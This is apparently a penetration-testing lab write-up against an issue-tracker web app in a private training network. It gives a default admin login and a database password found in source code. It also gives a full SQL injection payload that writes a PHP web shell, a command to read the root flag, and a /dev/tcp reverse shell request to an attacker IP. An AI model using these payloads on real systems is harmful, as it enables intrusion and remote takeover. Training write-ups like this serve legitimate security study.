#Pwned! 

## Nmap
```

```

## Nmap UDP


# Enumeration

## HTTP
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240925124008.png?raw=true)

admin:admin

download issuetracker.zip
analyze code
```
cat issuetracker/src/main/java/com/issue/tracker/issues/IssueController.java
```
issue_user:ManagementInsideOld797
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240926094027.png?raw=true)

sql credentials
possible sqli

```
/issue/checkByPriority?priority=' union select '<?php system($_GET["cmd"]); ?>' into outfile '/srv/http/cmd.php' -- -
```

```
POST /issue/checkByPriority?priority=%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%24%5f%47%45%54%5b%22%63%6d%64%22%5d%29%3b%20%3f%3e%27%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%73%72%76%2f%68%74%74%70%2f%63%6d%64%2e%70%68%70%27%20%2d%2d%20%2d HTTP/1.1

Host: 192.168.169.147:17445

Accept-Language: en-US

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Encoding: gzip, deflate, br

Cookie: JSESSIONID=89166675E7FFFB6F2143ED1480750891

Connection: keep-alive


```

```
http://192.168.169.147:30455/cmd.php?cmd=cat%20/root/proof.txt
```

reverse shell method
```
GET /cmd.php?cmd=sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.223%2F443%200%3E%261 HTTP/1.1

Host: 192.168.169.147:30455

Accept-Language: en-US

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Encoding: gzip, deflate, br

Cookie: JSESSIONID=89166675E7FFFB6F2143ED1480750891

Connection: keep-alive
```


# PrivEsc

## Manual

## Automated

### Peass
### Mimikatz


